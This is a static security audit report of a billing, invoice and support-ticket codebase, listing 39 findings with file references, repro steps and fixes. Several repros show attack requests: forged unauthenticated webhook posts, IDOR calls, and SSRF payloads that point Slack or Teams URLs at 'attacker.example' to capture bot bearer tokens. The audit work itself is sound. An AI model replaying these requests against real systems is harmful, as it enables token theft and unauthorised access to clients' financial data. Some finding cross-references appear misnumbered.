# Phase 2, Area A: billops + invoice + tickets bug hunt

Method: static read of the code only. No builds, no tests run, no source changed, nothing committed. Every finding says `confirmed` (the code shows it unambiguously) or `suspected` (needs runtime or data to prove). Secrets are referenced by key name only.

Paths are relative to the repo root. `B` = `billops/src/main/java/com/xammer/billops`, `X` = `xamops-service/src/main/java/com/xammer/cloud`, `IMS` = `B/service/InvoiceManagementService.java`.

## Summary

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 13 |
| Medium | 19 |
| Low | 5 |
| Total | 39 |

Already known and not repeated here: M-1 / M-2 (media-ops), S-1, S-2, S-5 (other areas).

Not checked (out of reach by reading): runtime behaviour of Tomcat path normalisation (A-16 traversal), real JVM default locale (A-22), multi-replica deployment topology (A-27, A-28), whether the frontend renders ticket subject/description as HTML (A-24).

---

## Critical

### A-01 Critical, confirmed: Teams and Google Chat webhooks are unauthenticated; Slack signature check is optional
- File: `B/config/SecurityConfig.java:81-85` (`web.ignoring()` for `/api/billops/webhook/**`), `B/controller/MessagingWebhookController.java:101` (Slack), `:218` (Teams handler has no check at all), `:288` (GChat handler has no check at all).
- Description: the webhook path skips Spring Security entirely. Slack: the signature is verified only `if (slackSig != null && timestamp != null)`. A caller who omits both headers skips verification, so the check protects nothing. Teams and GChat never verify a Bot Framework JWT or a Google ID token. Anyone on the internet can POST forged events. Effects: insert `SupportMessage` rows as any linked user (they land in the admin support inbox as that user's reply), mark/clear auto-ping state, and trigger the file download in A-03.
- Repro: `curl -X POST https://<host>/api/billops/webhook/slack -d '{"type":"event_callback","event":{"type":"message","channel":"<known channel id>","user":"<id>","text":"pay now","ts":"1.1"}}'` with no Slack headers. Expect 401. Current code returns 200 and saves a message. Same for `/teams` and `/gchat` with a minimal JSON body.
- Failing-test idea: MockMvc/standalone controller test, `signingSecret` configured, request without `X-Slack-Signature`; assert 401. Teams/GChat: request without `Authorization` header; assert 401/403.
- Fix: make Slack headers mandatory when the integration is enabled (reject if absent, reject if no signing secret configured), add a +/-5 minute timestamp window, compare with `MessageDigest.isEqual`. Validate the Bot Framework JWT for Teams and the Google Chat bearer token (audience = project number) for GChat.

### A-02 Critical, confirmed: invoice admin API has no role check (any authenticated user can finalize, delete, discount, merge, edit invoices)
- File: `B/controller/AdminInvoiceController.java:72` (`/generate`), `:181` (list), `:200` (get), `:206` (PUT edit), `:212` (`/discount`), `:316` (`/finalize`), `:329` (remove discount), `:335` (DELETE), `:350` (`/merge`). `B/config/SecurityConfig.java:123-140` has no rule for `/api/admin/**` (falls to `anyRequest().authenticated()`).
- Description: only the private-pricing, holding-cost and upload endpoints carry `@PreAuthorize`. The class Javadoc itself says "every endpoint without its own @PreAuthorize is reachable by any authenticated BillOps user". A normal customer (`ROLE_BILLOPS`) can list every client's invoices (amounts, client names, account ids), apply a 100% discount, finalize (which emails the client users), delete drafts, merge invoices, and generate drafts which call Cost Explorer/BigQuery on the platform's cost.
- Repro: log in as a non-admin customer user, `PUT /api/admin/invoices/{id}/discount` body `{"serviceName":"ALL","percentage":100}` then `POST /api/admin/invoices/{id}/finalize`. Expect 403. Current code returns 200.
- Failing-test idea: `@WebMvcTest`/MockMvc with `@WithMockUser(authorities="ROLE_BILLOPS")` against each mapping in the controller; assert 403. Reflection test: every public handler in `AdminInvoiceController` has `@PreAuthorize`.
- Fix: put `@PreAuthorize("hasAnyAuthority('ROLE_BILLOPS_ADMIN','ROLE_BILLOPS_ADMIN_SUB','ROLE_SUPER_ADMIN')")` on the class, keep the stricter method-level annotations. Add `.requestMatchers("/api/admin/**").hasAnyAuthority(...)` in `SecurityConfig` as a second layer. Decide separately whether `_SUB` may finalize.

---

## High

### A-03 High, confirmed: Slack inbound file download is SSRF and sends the bot token to an arbitrary URL, no size/type limits
- File: `B/controller/MessagingWebhookController.java:151-165` (reads `files[0].url_private` from the payload), `:469-503` (`downloadSlackFile`).
- Description: `new URL(slackUrl)` is taken verbatim from the request body and opened with `Authorization: Bearer <botToken>` (per-user `userBotToken` or global `botToken`). No host allowlist (the project already has `WebhookUrlValidator` for the outbound side). An attacker (see A-01, no signature needed, only a known channel/user id) points it at their own server to harvest the workspace bot token, or at `http://169.254.169.254/...` / internal services (response is stored and served back through the support files endpoint, see A-16). `HttpURLConnection` follows same-protocol redirects, `Files.copy(is, filePath)` is unbounded (disk fill, 30s read timeout per request on the servlet thread), and the stored name keeps the attacker's extension (`UUID_name.html`).
- Repro: forged event with `files:[{"url_private":"https://attacker.example/x","name":"a.html","mimetype":"text/html"}]`; observe `Authorization: Bearer ...` at the attacker host.
- Failing-test idea: unit test with a local `HttpServer` as the "Slack" URL; assert no request is made when the host is not `files.slack.com`/`*.slack.com`, and that no auth header ever leaves for non-Slack hosts.
- Fix: allowlist `https` + `files.slack.com`/`*.slack.com`, resolve and reject private IPs, disable redirects, cap bytes read (e.g. 25 MB), run `TicketAttachmentPolicy`-style extension/content-type allowlist on the stored name, download asynchronously.

### A-04 High, confirmed: Teams `serviceUrl` is stored and used without `WebhookUrlValidator`
- File: `B/controller/MessagingWebhookController.java:226,239,402` (stores payload `serviceUrl` as `webhookUrl`), `B/service/ExternalMessagingService.java:369-386` (priority-1 Bot Framework send passes `conn.getWebhookUrl()` straight to `teamsMessagingService.sendMessage`), `B/service/TeamsMessagingService.java:69-81` (`serviceUrl + "v3/conversations/..."`).
- Description: the validator is applied only to the webhook fallback path (`:391`). The Bot Framework path sends `Authorization: Bearer <Microsoft token>` plus the message to whatever host the unauthenticated Teams webhook put in `serviceUrl`. Registration needs a valid 6 char code (`TeamsController`), so the attacker needs one issued code, but the Teams endpoint is open (A-01) and `serviceUrl` is attacker controlled in the same payload.
- Repro: register with a valid code and `serviceUrl=https://attacker.example/`; trigger an admin reply to that user; attacker receives the bearer token and message.
- Fix: validate `serviceUrl` with `WebhookUrlValidator.isValid` both when storing and before sending; verify the activity JWT (A-01).

### A-05 High, confirmed: Google Chat auto-register trusts the unauthenticated payload email and rebinds the victim's channel
- File: `B/controller/MessagingWebhookController.java:269-280`, `:413-432` (`autoRegisterGChatUser`).
- Description: `senderEmail` comes from the request body. `appUserRepository.findByEmail(email)` finds any real user, then `conn.setChannelId(spaceName)` overwrites that user's existing GChat connection with the attacker's space. All later outbound support replies for that user (which can include ticket content, invoice talk) go to the attacker's space. Also `findByEmail` is not tenant/case normalised (suspected: case-variant emails resolve to different users).
- Repro: POST a `MESSAGE` event with `sender.email=<victim email>`, `space.name=spaces/ATTACKER`. Then `GET /api/billops/messaging/users/{victimId}/connections` shows the changed channel.
- Fix: require A-01 token verification, never overwrite an existing active connection from an inbound event, require an admin-issued registration code like Teams.

### A-06 High, confirmed: re-finalizing is allowed; finalize has no status guard (also resurrects VOID invoices)
- File: `IMS:2692-2722` (`finalizeInvoice`).
- Description: no check on current status. Calling finalize on a FINALIZED invoice with a different `exchangeRate` silently changes the locked INR rate (the PDF totals change), recalculates totals, and sends the "invoice ready" email to all client users again. On a VOID invoice it flips it back to FINALIZED. Similar missing guards: `applyDiscountToInvoice` (`:2124`) and `updateInvoice` (`:2797`) and `removeDiscountFromInvoice` (`:2547`) only reject FINALIZED, not VOID.
- Repro: `POST /{id}/finalize {"exchangeRate":80}` then again with `{"exchangeRate":90}`; `GET` shows 90 and two emails were sent.
- Failing-test idea: service test with mocked repository: invoice status FINALIZED, call `finalizeInvoice(id, 90.0)`; expect `IllegalStateException`. Same for VOID.
- Fix: require `status == DRAFT` at the top; in the other mutators use `status != DRAFT` instead of `== FINALIZED`; make exchange rate immutable once set.

### A-07 High, confirmed: finalizing without a rate does not lock the INR rate; PDFs of the same finalized invoice change over time and can silently use 86.0
- File: `IMS:2692-2698` (rate stored only if supplied), `:240-303` (`fetchUsdToInrRate`: invoice rate, then stored account rate, then live third-party API, then hardcoded `86.0` at `:303`).
- Description: for a finalized invoice with `exchangeRate == null`, each PDF download re-fetches the live rate, so the INR total, GST and amount-in-words differ day to day. A legal tax invoice must be stable. If both external APIs are blocked or down the code prints a tax invoice at a hardcoded 86.0 with only a WARN log. `fetchUsdToInrRate` also builds a new `HttpClient` on every call (`HttpClient.newHttpClient()`, resource churn) and makes up to 2 x 5s external calls on the request thread.
- Repro: finalize with empty body; download the PDF on two days (or mock the API to return different values); totals differ. Block outbound HTTPS; PDF shows rate 86.
- Fix: require a rate to finalize (or resolve and persist it at finalize time), make PDF generation read only the stored rate and fail with a clear error if absent. Remove the silent fallback; cache one shared `HttpClient`.

### A-08 High, confirmed: tax invoices print one hardcoded IRN, Ack No and Ack Date
- File: `IMS:307-309` (`IRN_VALUE`, `IRN_ACK_NO`, `IRN_ACK_DATE` constants, comment says "replace with real API data"), `:311-345` (`addIrnSection`), used when `dto.isIncludeIrn()`.
- Description: every invoice with `includeIrn=true` carries the same IRN, a QR encoding that same IRN, and the same ack number/date. These are e-invoice (GST) identifiers that must be unique per invoice and issued by the IRP. Issuing documents that show a fake IRN is a compliance problem. The includeIrn flag is a request parameter reachable by any authenticated user (A-02).
- Repro: generate two invoices with `includeIrn=true`; both PDFs show the same IRN.
- Fix: disable the IRN block unless a real IRN is stored on the invoice; integrate the IRP API or remove the option.

### A-09 High, confirmed: any authenticated user can render an official-looking tax invoice PDF from a body they supply
- File: `B/controller/InvoiceViewController.java:130-170` (`/download-preview`), `:88-124` (`/download-detail`).
- Description: both endpoints take an `InvoiceDto` from the request body and pass it to `generatePdfFromDto`, which prints the company header, GSTIN, IRN (A-08) and totals taken from the caller's JSON. No ownership or draft/finalized check, no watermark. Anyone can produce a convincing invoice for any amount and client. Also the logger prints request-supplied account ids (log injection, Low).
- Repro: `POST /api/invoices/download-preview` with a hand-written DTO (`billingPeriod`, `lineItems`, `amount`), receive a PDF.
- Fix: accept an invoice id only, load it server side, apply the account scope; keep a watermarked "PREVIEW" path for drafts for admins only.

### A-10 High, confirmed: finalized invoice view by `accountId` has no access check and a tenant-blind cache key
- File: `B/controller/InvoiceViewController.java:38-58`, `IMS:2725-2742` (`@Cacheable(value="invoiceDtos", key="{#accountId, #year, #month}")`).
- Description: `accountId` (AWS id, GCP project or Azure subscription) comes from the query string. `AccountAccessHelper` exists but is not used here. Any logged-in user receives any account's finalized invoice DTO (line items, amounts, client). The Spring cache key has no tenant component, so in a multi-tenant setup the cached DTO from one tenant DB can be served to another tenant for the same id. `getInvoiceForAdmin(id)` (`:2744`) likewise has no scope check (sub-admins).
- Repro: user A requests `/api/invoices/view?accountId=<B's AWS id>&year=2025&month=5`.
- Fix: resolve the account through the caller's allowed account list (`AccountAccessHelper`) before the query; add tenant to cache key; apply `applyInvoiceFilter` semantics to `getInvoiceForAdmin`.

### A-11 High, confirmed: billing dashboards accept arbitrary `accountIds` (access helper injected but never used)
- File: `B/controller/BillopsController.java:83-103` (`/billing`), `:105-123` (`/detailed-breakdown`), `:144-160` (legacy `{accountId}`), `:52,64,75` (`accountAccessHelper` declared and assigned, no other reference).
- Description: `accountIds` is passed straight to `BillingService`; grep of `BillingService` shows no access helper either. Any authenticated user can read the cost data of any account, and can force Cost Explorer calls with `forceRefresh=true` (cost/DoS). The `/billing/gcp/dashboard/{accountIdentifier}`, `/billing/azure/dashboard/{subscriptionId}`, `/export` and `/breakdown/instances` handlers look similar but I did not read their service bodies (suspected).
- Repro: user of client A calls `/api/billops/billing?accountIds=<client B account>`.
- Failing-test idea: parameterised MockMvc test: user mapped to account X requests Y, expect 403/empty.
- Fix: filter `accountIds` through `AccountAccessHelper.getAllowedDbIds()`-based provider ids and 403 on mismatch; restrict `forceRefresh` to admins.

### A-12 High, confirmed: ticket mutation endpoints have no object-level authorisation (billops and xamops)
- File: `B/service/TicketService.java:446-449` (`addReplyToTicket`, `findById` only), `B/controller/TicketController.java:314-351` (reply endpoint, no scope check); `X/service/TicketService.java:342-344`, `X/controller/TicketController.java:67`.
- Description: viewing is scoped (`getTicketById` runs `applyAccountFilter`), but `POST /tickets/{id}/replies` loads by id and appends. Any authenticated user can post into any ticket, including other clients' tickets, which also emails the ticket creator/admin inbox with the attacker's content, resets the 45 minute reminder and SLA flags (`setHasNewUserReply`, `resumeSlaClock`) and flips the ticket to IN_PROGRESS. Replies can carry attachments (S3 upload). The id is a sequential Long.
- Repro: user A posts `POST /api/billops/tickets/{id of B's ticket}/replies` (multipart `message=hi`). Expect 404/403, current: 200 and ticket changed.
- Fix: call the same visibility check used for reads before any write; share one `assertCanAccess(ticket)` helper.

### A-13 High, confirmed: xamops-service `createTicket` takes `creatorId` and `clientId` from the request body
- File: `X/controller/TicketController.java:41-44`, `X/service/TicketService.java:137-157`.
- Description: billops overrides `creatorId` with the authenticated id (`B/controller/TicketController.java:60-65`); xamops passes the DTO unchanged. A caller can create a ticket attributed to any user (admin, other client) and, when that user has no client, any `clientId`. The ticket then shows in that user's lists and notifies from their identity. `accountId` is also never validated against the caller's accounts in either service.
- Repro: `POST /api/xamops/tickets {"creatorId":<other user>, "subject":"x", ...}`.
- Fix: derive creator and client from `Authentication`; validate `accountId` belongs to them.

### A-14 High, confirmed: stored XSS vector through the support file endpoint (inline, probed content type, any extension)
- File: `B/controller/SupportAdminController.java:594-616` (`serveFile`, `Files.probeContentType`, `Content-Disposition: inline`), `:554-575` (upload keeps any extension), `B/controller/MessagingWebhookController.java:477-495` (Slack inbound keeps attacker name/extension).
- Description: files are served from the application origin with a content type guessed from the extension and no `X-Content-Type-Options`, so an uploaded or Slack-delivered `.html`/`.svg` runs as script in the admin's session (billops CSP allows `'unsafe-inline'` scripts, `SecurityConfig.java:154-156`). The admin `/upload` and the open Slack path (A-01/A-03) both reach it. `TicketAttachmentPolicy` protects only ticket replies. Also `tenantId` is not tied to the caller (the code comment at `:586-592` admits a cross-tenant read), and with `tenantId=".."` the path becomes `uploadDir/support/../<filename>`; whether Tomcat lets `%2e%2e` through is untested (suspected).
- Repro: get an `evil.html` into `support/slack-inbound` (A-03), open the returned `/api/billops/support/files/slack-inbound/<uuid>_evil.html` as an admin.
- Fix: serve with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` unless the type is a safe image/PDF; apply the extension allowlist at upload and at Slack download; scope `tenantId` to `TenantContext`; normalise and `startsWith(base)` check the resolved path.

### A-15 High, confirmed (data), suspected (period): GCP invoice draft ignores the requested month and swallows failures into an empty draft
- File: `IMS:1494-1538` (GCP branch calls `gcpCostService.getGcpBillingDashboardDtoAndCache(accountId)` with no year/month), `:1537-1539` and `:1571-1573` (`catch (Exception e) { logger.error(...) }` then continues).
- Description: the signature `getGcpBillingDashboardDtoAndCache(String)` (`B/service/GcpCostService.java:57`) has no period, so a draft for March built in May uses whatever the dashboard returns (the dashboard's window; not verified). Any exception (BigQuery auth failure, missing key returns `Optional.empty()`) is logged and the code goes on to build and save a draft with zero line items and amount 0, indistinguishable from "no usage". Azure branch has the same swallow pattern.
- Repro: GCP account without a service account key: `POST /generate` returns 200 with an empty draft.
- Fix: pass year/month to the billing query; on failure throw (409 like the CUR path); refuse to create zero-line drafts.

---

## Medium

### A-16 Medium, confirmed: `mergeDraftInvoices` with the same id deletes the invoice; other merge defects
- File: `IMS:2752-2790`.
- Description: `target == source` copies items to themselves, then `source.getLineItems().clear()` empties the target's list too, then `invoiceRepository.delete(source)` deletes the target. Orphaned `privatePricings` and `marketplaceCharge`/holding cost of the source are dropped without notice (the source row is deleted), and nothing checks that both invoices belong to the same client, account or billing period. `.orElseThrow()` without message surfaces as 400 with no reason (controller catches `Exception`).
- Repro: `POST /api/admin/invoices/merge?targetInvoiceId=5&sourceInvoiceId=5`.
- Fix: reject equal ids, require same client+period, move or refuse pricings/marketplace, return a message.

### A-17 Medium, confirmed: discount percentage is not validated
- File: `IMS:2122-2142` (`applyDiscountToInvoice`), `:1186-1195` (preview), controller `AdminInvoiceController.java:212-217`.
- Description: `percentage == null` throws NPE (500); negative values act as a surcharge; values above 100 (or several discounts summing above 100) make `taxableValue` clamp silently to 0 (`:2672`), billing zero. Compare with holding cost which is range checked. Also `String.format("%.2f%%", percentage)` is locale dependent.
- Failing-test idea: `applyDiscountToInvoice(id,"ALL",new BigDecimal("150"))` expects IllegalArgumentException; `null` expects IllegalArgumentException not NPE; negative expects reject.
- Fix: validate 0 < p <= 100 and total discount per scope <= 100.

### A-18 Medium, confirmed: `updateInvoiceLineItems` finalizes the invoice as a side effect and has several NPE/silent-default paths
- File: `IMS:2915-2945`.
- Description: the method named "update line items" sets `FINALIZED` (`:2937`) without sending the finalize email or locking a rate (see A-07). `li.getId().equals(...)`, `item.getUsageQuantity().split(...)` and `update.unitRate.multiply` NPE on null. When the quantity cannot be parsed it silently uses 1 (`:2930`), so a bad value bills `unitRate x 1` instead of failing. Quantities are written with `String.format("%.3f", ...)` (`:1428`, `:1734`, `:2903`) which uses the JVM default locale: with a comma-decimal locale ("12,500") `new BigDecimal` fails and the 1 fallback kicks in (suspected, needs a non-English default locale).
- Fix: do not change status here; validate input; use `Locale.ROOT`/`BigDecimal.toPlainString`; throw on parse failure.

### A-19 Medium, confirmed (items 1,2,3) / suspected (item 4): invoice PDF arithmetic is computed separately from the stored totals
- File: `IMS:216` and `:700,:724` (PDF tax computed on INR values at scale 2), `:2679` (stored tax at scale 4 in USD), `:700` (CGST/SGST use literal `0.09`, not `IGST_RATE`), `:737-749` (round off prints `roundOff.abs()` so the sign is lost: a negative round-off prints as positive), `:825` (`tax.divide(2)` in another path).
- Description: (1) the PDF total is `round(taxableUSD x rate)` then tax on that, while the stored `amount` is USD tax-inclusive; these can differ by paise, so the PDF total and the DB/portal total disagree (suspected size: up to a few paise per line). (2) If `IGST_RATE` is ever changed, CGST/SGST stay at 9%. (3) Round-off sign is lost, so lines do not add up visibly. (4) `halfTax` is rounded once and used twice, so CGST+SGST can differ from 18% of taxable by 0.01.
- Failing-test idea: property test generating random USD amounts and rates, assert PDF-extracted total equals `grand total x rate` within 0.00 after one defined rounding rule.
- Fix: one rounding policy; compute INR once at finalize and persist `taxableInr/taxInr/totalInr`; derive CGST/SGST from the persisted tax.

### A-20 Medium, confirmed: `getAllInvoicesAndCache` loads every invoice with no pagination, and the full list lands in Redis
- File: `IMS:2851-2869`, `AdminInvoiceController.java:181-197`.
- Description: `invoiceRepository.findAll()` mapped to DTOs with line items (`InvoiceDto.fromEntity`), cached for the whole tenant; grows without bound (N+1 lazy loads possible, suspected). `forceRefresh=true` is available to any caller (A-02). Memory and response size grow with invoice count; no `Pageable`.
- Fix: paginate and project a summary DTO for the list; admin-only forceRefresh.

### A-21 Medium, confirmed: sub-admin account scope is not enforced on ticket writes and search
- File: `B/controller/TicketController.java:99-128` (`search-replies`, `search-chats`), `:339-375` (`close`, `assign`, `transfer`, `reopen`, `email`), `:402-418` (`/clients/{clientId}/accounts`); `B/service/TicketService.java:595,626,683,744` (all `findById` without scope).
- Description: reads were scoped through `applyAccountFilter`; the chat search runs over all tickets and returns text snippets, and a `ROLE_BILLOPS_ADMIN_SUB` user restricted to some clients can close, reassign, transfer or email tickets outside the granted accounts, and list any client's cloud account ids by `clientId`.
- Fix: reuse `adminAccessScope` for every write and for the search queries.

### A-22 Medium, confirmed: `applyAccountFilter` fails open for admin roles when the tenant user row is missing
- File: `B/service/TicketService.java:287-303`.
- Description: if no `AppUser` is found by id or username, only `ROLE_BILLOPS_ADMIN_SUB` gets an empty list; any other role containing `BILLOPS_ADMIN` returns the unfiltered list (the comment says "as before"). Also `effectiveRole` is the first `ROLE_` authority of an unordered collection (`:279-282`), so a user with two roles can flip between scoped and unscoped behaviour (suspected).
- Fix: fail closed; evaluate all authorities explicitly.

### A-23 Medium, confirmed: ticket subject/description are stored unsanitised in both services
- File: `B/service/TicketService.java:102-103,165-166`, `B/controller/TicketController.java:55-72` (no sanitise call on create), `X/service/TicketService.java:137-157`.
- Description: replies are sanitised (`TicketHtmlSanitizer`) but create paths are not. Emails escape the values (billops) so those are safe; whether the UI renders description as HTML is unknown (plan S-6 lists `dangerouslySetInnerHTML` in the ticket pages; that is for Area E to confirm). The description of admin-created tickets is also unsanitised. No length limits on subject or description either.
- Fix: sanitise description, escape/strip subject, enforce max lengths in the service.

### A-24 Medium, confirmed: xamops-service new-ticket email interpolates user input as raw HTML
- File: `X/service/TicketService.java:178-203` (creator username, client name, category, service, severity, description inserted without escaping).
- Description: billops escapes every field (`escapeHtml`); the xamops copy does not. A customer can inject markup (fake "Reset your password" block, remote images, links) into the email delivered to the support inbox. Scripts do not execute in mail clients, so impact is phishing/spoofing of staff.
- Fix: reuse an HTML escape for all fields, or share the billops email builder.

### A-25 Medium, confirmed: sanitiser policy allows `data:` URLs on links and a global `class` attribute; two diverging copies
- File: `B/util/TicketHtmlSanitizer.java` and `X/util/TicketHtmlSanitizer.java` (identical today; `.allowUrlProtocols("data")` with `.allowAttributes("href").onElements("a")`, `.allowAttributes("class","dir").globally()`).
- Description: `data` is meant for pasted screenshots in `img src`, but the allowlist is not element-scoped, so `<a href="data:text/html;base64,...">` survives (modern browsers block top-level navigation to data URLs, but some embedded webviews and mail clients do not; suspected). Arbitrary `class` lets an attacker reuse the app's own CSS classes (fixed/overlay utility classes) for UI redress inside a reply (suspected, depends on the frontend CSS). Two copies will drift.
- Fix: limit `data:` to `img[src]` (custom `AttributePolicy`), restrict `class` to `ql-*`, move the class into `permissions-common`.

### A-26 Medium, confirmed: reminder schedulers call their own `@Transactional` method (proxy bypassed), mark before send, no cluster lock
- File: `X/service/TicketReminderScheduler.java:34-41,43-56`; same pattern in `B/service/SupportAutoNotificationScheduler.java:57-63,70-100`.
- Description: `checkAndSendReminders` invokes `collectAndMarkSent` on `this`, so the transaction annotation never applies; each `save` commits on its own. `reminderSentAt` is set before the email is sent, so a send failure (caught and logged) loses the reminder forever. There is no lock, so two instances read the same rows and both send (no ShedLock in any pom; grep over poms found none). In billops, the comment says lazy `AppUser.client` is read "while the session is still open", but with no transaction the lazy read at `:96-100` is expected to raise `LazyInitializationException` (suspected, needs a run without open-in-view for scheduler threads). In multi-tenant billops the scheduler thread has no `TenantContext`, so only the default tenant is processed (suspected).
- Failing-test idea: run the scheduler bean from the Spring context (not a plain `new`) and assert a failing `EmailService` leaves `reminderSentAt` null; two concurrent calls send once.
- Fix: move the transactional work to another bean (or `TransactionTemplate`), set the mark after a successful send (or use a status/claim row), add ShedLock.

### A-27 Medium, confirmed (design), suspected (impact): Slack OAuth state and Teams registration codes live in static/in-memory maps
- File: `B/controller/SlackOAuthController.java:56`, `B/controller/TeamsController.java:53-54`.
- Description: restart or a second replica loses pending states/codes; the OAuth callback landing on a different pod fails with "invalid state"; Teams codes (valid 48 h) vanish on deploy. The Teams code is 6 chars `[A-Z0-9]` checked by an unauthenticated endpoint with no rate limit (A-01), brute force is feasible for a big pool of outstanding codes (suspected).
- Fix: store in Redis/DB with TTL, rate limit the webhook, longer codes.

### A-28 Medium, confirmed: credentials committed in tracked properties files
- File: `billops/src/main/resources/application.properties:171` (`spring.mail.password` literal; commented `spring.datasource.password` at `:21`), `application-preprod.properties:8` (`spring.datasource.password`), `:48` (`spring.mail.password`), `:76` (`anythingllm.api.key`), `application-local.properties:8,69,70` (`spring.datasource.password`, `app.impersonation.secret-key`, `app.encryption.secret-key`). `git ls-files` shows all six `application*.properties` are tracked. prod/uat use env placeholders.
- Description: literal secrets sit in the repo history and the base `application.properties` applies to every profile, so the mail credential is the default everywhere. Values not repeated here. If the local impersonation/encryption keys equal any deployed key, JWT forging and data decryption are possible (could not check without comparing values; suspected).
- Fix: rotate the affected credentials, move to env/secret manager, add a secret scanner (gitleaks) to CI, purge from history if policy requires.

### A-29 Medium, confirmed: no upload size limits on the servlet layer
- File: `billops/src/main/resources/application.properties:10-11` (`max-file-size=-1`, `max-request-size=-1`).
- Description: unlimited multipart. `TicketAttachmentPolicy` (25 MB) runs after the file is already spooled, `SupportAdminController.uploadAttachment` has no limit at all, the Slack download is unbounded (A-03). `FileStorageService` switches to multipart S3 upload above 100 MB, so very large uploads are allowed through the credits path too. Disk/S3 cost and DoS.
- Fix: set realistic limits (e.g. 25 MB file, 30 MB request) and enforce in handlers.

### A-30 Medium, confirmed: `RedisCacheService.evictByPrefix` uses `KEYS` and is not tenant scoped
- File: `B/service/RedisCacheService.java:78-88`, called from `B/service/TicketService.java:1155-1156,1160` with prefixes lacking the tenant suffix.
- Description: the Javadoc says SCAN but the code calls `redisTemplate.keys(prefix + "*")`, an O(N) blocking command on a shared Redis. The key built by `getTenantCacheKey` is `<base>:<tenant>`, but the prefix used (`tickets:category:<cat>:user:`) has no tenant part, so one tenant's ticket update flushes every tenant's per-user category cache (correctness is fine, cache-stampede/perf is not). Every ticket reply/close triggers it.
- Fix: SCAN with count, include tenant in the prefix.

### A-31 Medium, confirmed: `/api/billops/accounts` returns the full `CloudAccount` entity to every client user
- File: `B/controller/BillopsController.java:292-311`, `B/domain/CloudAccount.java:33,39` (`externalId`, `roleArn` are not `@JsonIgnore`).
- Description: AWS `externalId` (the AssumeRole confused-deputy secret), role ARN, Azure tenant/client ids, Grafana IP and other fields are serialised. Restricted sub-users are not filtered either (`findByClientId` returns all of the client's accounts). `gcpServiceAccountKey` and `azureClientSecret` are correctly hidden.
- Fix: return a DTO with only display fields; filter by the user's allowed accounts.

### A-32 Medium, confirmed: `/api/billops/credits/user/{userId}` (cached and fresh) is an IDOR
- File: `B/controller/BillopsController.java:483-495`.
- Description: no check that `userId` is the caller (or in the admin's scope); credit request details (and thus attachment names) of any user can be read. Attachment URL minting is checked (`canAccessAttachments`), the list is not.
- Fix: compare with the authenticated user id unless admin within scope.

### A-33 Medium, suspected: timezone inconsistency in ticket and SLA timestamps
- File: `B/service/TicketService.java:119,473,524,542,599,726,739` use `LocalDateTime.now()` (JVM zone); `B/controller/TicketController.java:~336` and `MessagingWebhookController`/`SupportAutoNotificationScheduler` use `Asia/Kolkata`.
- Description: if the JVM runs in UTC (typical in containers), ticket/SLA times are UTC while support messages and the reminder working-hours window are IST. SLA durations use consistent clocks internally, but any cross-field comparison or display mixes 5.5 hour offsets. Needs a run in a UTC container to confirm.
- Fix: inject a `Clock`, store `Instant`/UTC, convert at display.

### A-34 Medium, confirmed: xamops-service ticket lists swallow errors, load everything, and rely on `findFirst` role
- File: `X/service/TicketService.java:227-282` and `:575-621`.
- Description: `findAll()` with no paging; any exception in scoping returns an empty list (looks like "you have no tickets" and hides outages and permission-lookup failures); `effectiveRole` takes the first `ROLE_` authority; any role containing "ADMIN" (e.g. a `ROLE_XAMOPS` tenant admin) sees all tickets across clients, while close/reopen require exactly `ROLE_BILLOPS_ADMIN` (`X/controller/TicketController.java:119-129`) and internal-note posting accepts three roles (`:103-106`), so role handling differs inside one controller.
- Fix: paginate, rethrow or return 5xx on failure, centralise role evaluation.

---

## Low

### A-35 Low, confirmed: Slack signature compared with `String.equals`, no replay window
- File: `B/controller/MessagingWebhookController.java:449`.
- Description: non constant time compare, no timestamp freshness check (replay of a captured signed request is accepted; dedupe by `ts` limits message replay only).
- Fix: `MessageDigest.isEqual`, reject `|now - ts| > 300s`.

### A-36 Low, confirmed: number-to-words for negative amounts
- File: `IMS:2964-2977`.
- Description: a negative total (credit note) prints "INR Minus Five and Minus Fifty Paise Only" (negative `paise` goes through `numberToWords`). Totals above the supported scale recurse on crores indefinitely large but fine.
- Fix: handle sign once.

### A-37 Low, confirmed: ETag from `List.hashCode()` and double URL decoding of the path category
- File: `B/controller/TicketController.java:586-600`, `X/controller/TicketController.java:131-143`.
- Description: `tickets.hashCode()` depends on `TicketDto.hashCode` (identity hash if not overridden, so the ETag never matches and 304 never occurs; not verified). `URLDecoder.decode` is applied to an already decoded path variable, so a literal `%` or `+` in a category (or malformed `%zz`) throws and returns 500. Also `forceRefresh` is available to every user, letting any user bypass the 60 minute cache.
- Fix: hash content fields, drop the second decode, restrict forceRefresh.

### A-38 Low, suspected: hardcoded fallback notification addresses
- File: `B/service/TicketService.java` (`@Value("${xamops.tickets.admin.technical-emails:...}")`, `billing-email:...`).
- Description: defaults are real-looking mail addresses; a misconfigured environment (UAT/local with real SMTP) would mail production inboxes. Config hygiene only.
- Fix: no default, fail fast, or default to empty.

### A-39 Low, confirmed: `HttpClient.newHttpClient()` per PDF render and 5 s blocking external calls on request thread
- File: `IMS:279`.
- Description: see A-07; listed separately because it affects latency: each PDF download can block up to 10 s on `currency-api` calls when the free API is slow.
- Fix: shared client, cache rate for the day.

---

## Suggested test order for the next step
1. A-02 (MockMvc role matrix on `/api/admin/invoices/**`), A-10/A-11 (account scoping), A-12/A-13 (ticket write authz). These are cheap and highest value.
2. A-01/A-03/A-04/A-05 webhook tests with a standalone controller and an in-JVM `HttpServer`.
3. A-06/A-16/A-17 invoice service tests with mocked repositories (existing `*Test` classes in `billops/src/test` show the style).
4. A-26 scheduler tests with the real Spring context (needs Docker for the PG tests; otherwise mocked).

## Counts
Critical 2, High 13, Medium 19, Low 5. (Numbering: A-01..A-02 Critical, A-03..A-15 High, A-16..A-34 Medium, A-35..A-39 Low.)
